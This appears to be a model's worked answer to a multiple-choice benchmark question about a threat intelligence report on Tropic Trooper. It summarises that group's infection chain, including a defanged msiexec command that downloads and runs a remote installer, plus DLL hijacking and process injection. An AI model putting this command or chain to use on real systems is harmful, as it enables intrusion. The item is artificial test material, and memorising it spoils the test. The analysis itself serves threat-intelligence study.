@@ -1,0 +1,67 @@
+### Step-by-Step Analysis
+
+#### 1. Analyze the CTI Report
+
+**Initial Access:**
+- Tropic Trooper used exploits for CVE-2017-11882 or CVE-2018-0802 to execute commands.
+- They downloaded and installed an installer package (.msi) using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.
+
+**Execution:**
+- The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) and then deleted itself.
+- UserInstall.exe dropped a normal sidebar.exe file, a malicious loader (wab32res.dll), and an encrypted configuration file.
+- UserInstall.exe used BITSadmin to create a job and launch sidebar.exe.
+- The malicious loader used DLL hijacking on sidebar.exe and launched dllhost.exe.
+- The loader injected a DLL backdoor into dllhost.exe.
+
+**Persistence:**
+- The backdoor decrypts the configuration file and uses SSL to connect to C&C servers.
+
+**Command and Control:**
+- TClient uses custom SSL libraries to connect to the C&C server.
+- The C&C server and configuration values are not hardcoded, allowing for easy updates.
+
+**Others:**
+- Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware.
+- The MSI file drops three files and creates a hidden directory (UFile) in C:\ProgramData\Apple\Update\.
+- The malicious wab32res.dll is loaded by a benign file (sidebar.exe) to evade AV detection.
+
+#### 2. Analyze the Question
+
+**Question:**
+- After injecting a malicious DLL backdoor into dllhost.exe, is Tropic Trooper likely to execute the FakeRun loader to launch dllhost.exe only after using Equation Editor exploits to execute an installer package with malicious payloads?
+
+**Answer Choices:**
+- A: Yes
+- B: No
+
+#### 3. Compare and Evaluate
+
+**Extracted Attack Sequence:**
+1. **Initial Access:**
+   - Exploit CVE-2017-11882 or CVE-2018-0802.
+   - Download and install an installer package (.msi).
+
+2. **Execution:**
+   - in.sys drops UserInstall.exe and deletes itself.
+   - UserInstall.exe drops sidebar.exe, wab32res.dll, and an encrypted configuration file.
+   - UserInstall.exe uses BITSadmin to launch sidebar.exe.
+   - wab32res.dll uses DLL hijacking on sidebar.exe to launch dllhost.exe.
+   - wab32res.dll injects a DLL backdoor into dllhost.exe.
+
+**Question Analysis:**
+- The question asks if Tropic Trooper is likely to execute a FakeRun loader to launch dllhost.exe after injecting the DLL backdoor.
+- The CTI report does not mention a "FakeRun loader" or any additional step to launch dllhost.exe after the injection.
+
+**Evaluation:**
+- The report clearly states that the malicious loader (wab32res.dll) uses DLL hijacking on sidebar.exe to launch dllhost.exe and injects the DLL backdoor into dllhost.exe.
+- There is no mention of a "FakeRun loader" or any additional step to launch dllhost.exe after the injection.
+
+#### 4. Provide a Step-by-Step Reasoning and Final Answer
+
+**Reasoning:**
+- The CTI report provides a detailed sequence of actions taken by Tropic Trooper.
+- The sequence includes the use of Equation Editor exploits to download and install the installer package, the execution of UserInstall.exe, the dropping of sidebar.exe and wab32res.dll, and the injection of the DLL backdoor into dllhost.exe.
+- The report does not mention any "FakeRun loader" or additional step to launch dllhost.exe after the injection.
+
+**Final Answer:**
+- B: No
